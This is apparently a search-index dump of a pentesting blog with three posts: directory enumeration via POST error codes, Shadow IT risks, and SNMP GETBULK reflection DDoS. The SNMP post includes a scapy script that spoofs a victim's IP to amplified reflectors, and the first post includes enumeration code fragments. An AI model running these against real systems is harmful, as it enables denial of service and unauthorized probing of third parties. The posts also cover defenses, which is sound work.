penetration test, I encountered an intriguing challenge. The app was so smart that it redirected all unauthorized requests to a login page, effectively locking me out of any useful paths. And as if that wasn\u2019t enough, it had DarkTrace\u2014a fancy, state-of-the-art IDS/IPS\u2014lurking in the background like a digital watchdog. \n\nBut hey, I\u2019ve been around long enough to know that even the most sophisticated defense can have its little cracks. This \"impenetrable\" login redirection? Yeah, it wasn\u2019t nearly enough to keep me from uncovering valuable directory information. Thanks to some *subtle* misconfigurations in error messages, I was able to do a little detective work and expose the hidden directories. So, let's dive in!\n\n## The Strategy: Harnessing POST Requests and Error Codes\n\nSo, this login redirect wasn\u2019t just annoying\u2014it was a redirection nightmare, throwing 302 status codes at me for every unauthorized request. The trick? You could just throw GET requests all day, and it would be like playing fetch with a brick wall. But guess what? I had other plans. Rather than repeatedly running into that 302 brick wall, I decided to mix things up with POST requests aimed at some known (or at least highly suspected) directory paths.\n\nThe real genius here was that these POST requests would bypass the redirect and, instead, trigger lovely, juicy error codes. This way, I could get more info than I ever could with a simple GET.\n\n### The HTTP Status Codes That Matter\n\nLet\u2019s break it down for the uninitiated. Here are the HTTP status codes that practically begged me to explore further:\n\n- **200 OK**: A valid directory exists. Finally, success! It\u2019s like finding the key to the treasure chest.\n- **302 Redirect**: Oops! Directory doesn\u2019t exist, but at least I\u2019m getting redirected back to the login page. How nice of it.\n- **403 Forbidden**: Oh, so the directory exists, but I\u2019m *not* allowed to see it? Classic. Time to dig a little deeper.\n- **500 Internal Server Error**: Triggering a 500 error means I\u2019ve either broken something or the server is just being a drama queen. Either way, valuable intel!\n\nWith this strategy locked in, I whipped up a Python script to handle all the tedious checking for me.\n\n## The Code: A Closer Look\n\n### Step 1: Setting the Stage: Imports and Functions\n\nHere\u2019s how you begin:\n\n```python\nimport requests\nimport sys\nimport re\n</code></pre> - requests: Because who doesn't love making HTTP calls and pretending to be a browser? - sys: For handling those lovely command-line arguments we all adore. - re: You know, for when you need to pull out the juicy bits from raw HTML.</p>"},{"location":"dirEnum500/#step-2-retrieving-session-id-and-csrf-token","title":"Step 2: Retrieving Session ID and CSRF Token","text":"<p>To be fair, the first thing you need to do is grab the session ID and CSRF token, because web apps love that stuff for security. Here\u2019s how it goes down:</p> <p><pre><code>def get_session_id_and_csrf_token(base_url):\n    try:\n        response = requests.get(base_url, timeout=5)\n        session_id = response.cookies.get('JSESSIONID')\n\n        csrf_token_match = re.search(r'name=\"_csrf\" value=\"([^\"]+)\"', response.text)\n        csrf_token = csrf_token_match.group(1) if csrf_token_match else None\n\n        if session_id and csrf_token:\n            print(f\"[INFO] Retrieved session ID: {session_id}\")\n            print(f\"[INFO] Retrieved CSRF token: {csrf_token}\")\n            return session_id, csrf_token\n        else:\n            print(\"[ERROR] Session ID or CSRF token not found.\")\n            sys.exit(1)\n    except requests.exceptions.RequestException as e:\n        print(f\"[ERROR] Failed to retrieve session ID and CSRF token: {e}\")\n        sys.exit(1)\n</code></pre> This part is like unlocking the front door with a shiny key.</p>"},{"location":"dirEnum500/#step-3-checking-directory-existence","title":"Step 3: Checking Directory Existence","text":"<p>Once you have your session cookie and CSRF token (because who doesn\u2019t want to pretend to be authenticated), it\u2019s time to check those directories. I mean, why not?</p> <p><pre><code>def check_directory(base_url, directory, session_id, csrf_token):\n    url = f\"{base_url}/{directory}\"\n    headers = {\n        # Headers mimicking a real browser\n    }\n    data = f\"username=test&amp;password=gahjkldsa&amp;_csrf={csrf_token}\"\n</code></pre> Here we simulate a login with some fake creds. No big deal. Just testing the waters, you know?</p>"},{"location":"dirEnum500/#step-4-bringing-it-all-together-the-main-function","title":"Step 4: Bringing It All Together - The Main Function","text":"<p>Finally, you bring it all together with the main function, which does all the dirty work and checks the directories for you:</p> <p><pre><code>def main():\n    if len(sys.argv) != 2:\n        print(\"Usage: python3 script.py &lt;directory_file&gt;\")\n        sys.exit(1)\n    # Read directories from the specified file and check each one\n</code></pre> Don\u2019t worry, it\u2019s flexible. You can just throw a file with directories at it, and voil\u00e0, results.</p>"},{"location":"dirEnum500/#conclusion-the-power-of-misconfigurations","title":"Conclusion: The Power of Misconfigurations","text":"<p>In the end, it's clear: even the most \"secure\" applications have cracks you can slip through. By exploiting some misconfigured error messages and strategically crafting requests, I was able to uncover hidden directories in a web app that thought it had all the bases covered. This isn't just about finding secret paths; it's about understanding how systems fail and how we can exploit those failures\u2014responsibly, of course.</p> <p>Let this be a reminder to all of us: no matter how fancy your security system is, there's always a little misstep that could open the door to the treasure chest. And let\u2019s be honest, there\u2019s always more treasure to find.</p> <p>```</p>"},{"location":"shadowIT/","title":"\u2601\ufe0f Shadow IT: The Hidden Risks Lurking in Your Network","text":"","tags":["Shadow IT","Risk Assessment","Data Leaks","Network Security"]},{"location":"shadowIT/#introduction","title":"Introduction","text":"<p>Ah, Shadow IT\u2014the bane of every security team\u2019s existence. You lock down everything, enforce strict policies, and yet, someone in marketing still decides to spin up a Dropbox account to \u201cmake collaboration easier.\u201d Congratulations, your data is now one misconfiguration away from public exposure. \ud83c\udf89</p> <p>Today, we\u2019ll cover: 1. What Shadow IT is and why it\u2019s a nightmare. 2. How attackers exploit it during a penetration test. 3. A real-world example of an actual breach caused by unauthorized services. 4. How to hunt for Shadow IT in your own network before the bad guys do.</p>","tags":["Shadow IT","Risk Assessment","Data Leaks","Network Security"]},{"location":"shadowIT/#what-is-shadow-it","title":"What is Shadow IT?","text":"<p>Shadow IT refers to unauthorized hardware, software, or cloud services used by employees without the approval (or knowledge) of the IT department. Examples include: - Personal Dropbox, Google Drive, or OneDrive accounts. - Employees running unauthorized web servers on company hardware. - Using third-party email services to bypass company filters. - Self-hosted VPNs or proxies for unrestricted internet access.</p> <p>\ud83d\udea8 Why is this a problem? \ud83d\udea8 - Data Loss &amp; Exposure \u2013 Unsecured storage can leak sensitive information. - No Security Patching \u2013 IT teams can\u2019t protect what they don\u2019t know exists. - Regulatory Compliance Violations \u2013 Data stored outside approved environments can get companies fined.</p>","tags":["Shadow IT","Risk Assessment","Data Leaks","Network Security"]},{"location":"shadowIT/#how-attackers-exploit-shadow-it","title":"How Attackers Exploit Shadow IT","text":"<p>From a pentester\u2019s perspective, Shadow IT is free real estate. If an employee deploys an unauthorized system, odds are: 1. It has weak authentication (or none at all). 2. It\u2019s not being monitored. 3. It exposes internal services to the internet.</p> <p>During a pentest, here\u2019s what we look for: - Cloud storage leaks: Employees syncing company data to personal Dropbox or Google Drive accounts. - Unauthorized web servers: We find forgotten Jenkins, phpMyAdmin, or Nextcloud instances running on high-numbered ports. - Exposed development environments: Test servers often run outdated software and have default credentials.</p>","tags":["Shadow IT","Risk Assessment","Data Leaks","Network Security"]},{"location":"shadowIT/#real-world-example-shadow-it-in-action","title":"Real-World Example: Shadow IT in Action","text":"<p>A financial institution we assessed had a strict no-cloud-storage policy. Except, as it turns out, that policy didn\u2019t stop a department from using a personal OneDrive account to share sensitive Excel spreadsheets.</p>","tags":["Shadow IT","Risk Assessment","Data Leaks","Network Security"]},{"location":"shadowIT/#what-we-found","title":"What we found:","text":"<ul> <li>One employee used their personal email to create a OneDrive account.</li> <li>A script automatically synced customer data to OneDrive every night.</li> <li>The account had no multi-factor authentication (MFA).</li> <li>The credentials were leaked in a previous data breach (thanks, HaveIBeenPwned).</li> </ul>","tags":["Shadow IT","Risk Assessment","Data Leaks","Network Security"]},{"location":"shadowIT/#result","title":"Result?","text":"<ul> <li>Attackers accessed customer financial records via the exposed OneDrive.</li> <li>The company suffered regulatory fines and legal action.</li> </ul>","tags":["Shadow IT","Risk Assessment","Data Leaks","Network Security"]},{"location":"shadowIT/#how-to-detect-eliminate-shadow-it","title":"How to Detect &amp; Eliminate Shadow IT","text":"<p>Want to stay ahead of the game? Here\u2019s how to hunt for rogue IT services:</p> <p>\ud83d\udd0d Monitor Outbound Traffic - Use firewall rules to detect connections to unauthorized cloud services. - Look for DNS requests to file-sharing platforms.</p> <p>\ud83d\udd0d Conduct Regular Asset Discovery - Use nmap, Shodan, or internal scans to find unapproved services. - Regularly audit cloud service usage via Microsoft 365, AWS, or Google Workspace logs.</p> <p>\ud83d\udd0d Educate Employees - Explain why Shadow IT is risky. If users know why it's dangerous, they might stop doing it (wishful thinking, but still). - Provide approved alternatives that are secure and user-friendly.</p>","tags":["Shadow IT","Risk Assessment","Data Leaks","Network Security"]},{"location":"shadowIT/#conclusion","title":"Conclusion","text":"<p>Shadow IT isn\u2019t just a minor inconvenience\u2014it\u2019s a massive security risk. Unauthorized services bypass security controls, expose sensitive data, and make incident response nearly impossible.</p> <p>Want to keep your network secure? Find and eliminate Shadow IT before attackers do. Because nothing says \u201cI care about security\u201d like not letting employees run their own rogue IT department. \ud83d\ude09</p> <p>\ud83d\udcac Thoughts? Have you encountered Shadow IT nightmares during a pentest? Drop your stories below!</p>","tags":["Shadow IT","Risk Assessment","Data Leaks","Network Security"]},{"location":"snmpGetBulk/","title":"\ud83d\ude80 SNMP 'GETBULK' Reflection DDoS \u2013 Weaponizing Network Services","text":"","tags":["SNMP","GETBULK","Reflection Attack","DDoS","Exploitation"]},{"location":"snmpGetBulk/#introduction","title":"Introduction","text":"<p>Ever heard of SNMP GETBULK? If not, congratulations on not being a network engineer. If yes, then you probably know that Simple Network Management Protocol (SNMP) is supposed to make life easier\u2014but surprise! It can also be used to wreak havoc on networks through reflection-based DDoS attacks. </p> <p>Today, we\u2019ll explore: 1. How SNMP 'GETBULK' works (for those who don\u2019t love reading RFCs for fun). 2. How attackers abuse it for DDoS reflection (because of course they do). 3. How to simulate the attack (for educational purposes, obviously). 4. How to prevent your network from being an unwilling accomplice (unless you want to be a botnet).</p>","tags":["SNMP","GETBULK","Reflection Attack","DDoS","Exploitation"]},{"location":"snmpGetBulk/#how-snmp-getbulk-works","title":"How SNMP 'GETBULK' Works","text":"<p>SNMP is typically used for network monitoring, allowing admins to query devices for status updates. The GETBULK request is part of SNMPv2 and is meant to efficiently retrieve large amounts of data at once (because who wants to send multiple small queries?).</p> <p>A typical GETBULK request structure looks like this:</p> Field Description <code>Version</code> SNMP version (usually v2c for bulk requests) <code>Community</code> Shared secret (default: 'public', because why not?) <code>PDU Type</code> GETBULKREQUEST identifier <code>Request ID</code> Unique identifier for the request <code>NonRepeaters</code> Number of single-instance variables to retrieve <code>MaxRepetitions</code> How many values to return (can be abused) <code>Variable Bindings</code> List of OIDs (Object Identifiers) being queried <p>Normally, this helps network admins get bulk data efficiently. But guess what? Attackers don\u2019t care about efficiency\u2014they care about bandwidth amplification.</p>","tags":["SNMP","GETBULK","Reflection Attack","DDoS","Exploitation"]},{"location":"snmpGetBulk/#how-snmp-getbulk-becomes-a-ddos-amplification-tool","title":"How SNMP 'GETBULK' Becomes a DDoS Amplification Tool","text":"<p>Reflection DDoS attacks work by spoofing the source IP address of requests, making a victim think they\u2019re receiving replies from legitimate sources. SNMP GETBULK is perfect for this because:</p> <ul> <li>The attacker sends a small query to an SNMP-enabled device.</li> <li>The device sends back a massive response to the spoofed IP (the victim).</li> <li>Multiply this by thousands of devices, and suddenly, the victim\u2019s network is drowning in data.</li> </ul> <p>\ud83d\udca1 Amplification factor: Depending on how misconfigured (or helpful) the SNMP device is, the response can be up to 100x the original request size. That\u2019s free bandwidth for attackers and bad news for targets.</p>","tags":["SNMP","GETBULK","Reflection Attack","DDoS","Exploitation"]},{"location":"snmpGetBulk/#python-script-to-simulate-a-getbulk-reflection-attack","title":"Python Script to Simulate a GETBULK Reflection Attack","text":"<p>Want to see it in action? Here\u2019s a simple Python script that sends SNMP GETBULK requests to an open SNMP server while spoofing the victim\u2019s IP. (Obviously, use responsibly.)</p> <pre><code>from scapy.all import *\nimport random\n\n# Target SNMP server (reflector) and victim\nREFLECTOR_IP = \"192.168.1.100\"  # Change this to an open SNMP server\nVICTIM_IP = \"203.0.113.50\"  # Change this to your victim\u2019s IP\nSNMP_PORT = 161  # Default SNMP port\n\n# Craft an SNMP GETBULK request (basic structure)\ndef craft_snmp_getbulk():\n    snmp_packet = IP(src=VICTIM_IP, dst=REFLECTOR_IP) / UDP(sport=random.randint(1024, 65535), dport=SNMP_PORT) /\n        SNMP(version=2, community=\"public\", PDU=SNMPbulk(id=random.randint(1000, 9999), non_repeaters=0, max_repetitions=50))\n    return snmp_packet\n\n# Send SNMP GETBULK packets\ndef send_reflection_attack():\n    print(f\"[+] Sending spoofed SNMP GETBULK requests to {REFLECTOR_IP}, victim: {VICTIM_IP}\")\n    for _ in range(10):  # Adjust for desired intensity\n        packet = craft_snmp_getbulk()\n        send(packet, verbose=False)\n    print(\"[+] Packets sent!\")\n\nsend_reflection_attack()\n</code></pre>","tags":["SNMP","GETBULK","Reflection Attack","DDoS","Exploitation"]},{"location":"snmpGetBulk/#expected-outcomes","title":"Expected Outcomes","text":"<ul> <li>If the SNMP server replies to the victim\u2019s IP with a huge response \u2192 You\u2019ve confirmed a reflection vulnerability.</li> <li>If nothing happens \u2192 The SNMP server might be properly secured (shocking!).</li> <li>If you accidentally crash something \u2192 Whoops. Maybe don\u2019t test this on production?</li> </ul>","tags":["SNMP","GETBULK","Reflection Attack","DDoS","Exploitation"]},{"location":"snmpGetBulk/#mitigation-defense-strategies","title":"Mitigation &amp; Defense Strategies","text":"<p>Tired of being part of a botnet? Here\u2019s how to avoid it:</p> <p>\u2705 Disable SNMP if you don\u2019t use it. (Seriously, most people don\u2019t even need it.) \u2705 Restrict SNMP to internal networks. (Your printer does not need to talk to the entire internet.) \u2705 Use strong SNMP community strings. (Change \u2018public\u2019 to something not guessable.) \u2705 Rate-limit SNMP responses. (Your device doesn\u2019t need to flood the internet with responses.) \u2705 Block UDP port 161 from untrusted sources. (If it\u2019s public, you\u2019re asking for trouble.) \u2705 Upgrade to SNMPv3 with authentication. (SNMPv2c is basically an open bar for attackers.)</p>","tags":["SNMP","GETBULK","Reflection Attack","DDoS","Exploitation"]},{"location":"snmpGetBulk/#conclusion","title":"Conclusion","text":"<p>SNMP 'GETBULK' is a great tool for network management\u2014until it isn\u2019t. With a 100x amplification factor, it\u2019s a favorite among DDoS attackers looking to overwhelm targets with reflected traffic. </p> <p>The good news? A few simple security measures can prevent your devices from being hijacked into a botnet. So lock it down before someone turns your innocent network printer into a DDoS cannon. \ud83d\udd25</p> <p>\ud83d\udd39 Want to see more network exploitation techniques? Stay tuned for upcoming posts! \ud83d\ude80</p> <p>\ud83d\udcac Got thoughts or questions? Drop them below, or complain to your local IT admin! \ud83d\ude09</p>","tags":["SNMP","GETBULK","Reflection Attack","DDoS","Exploitation"]}]}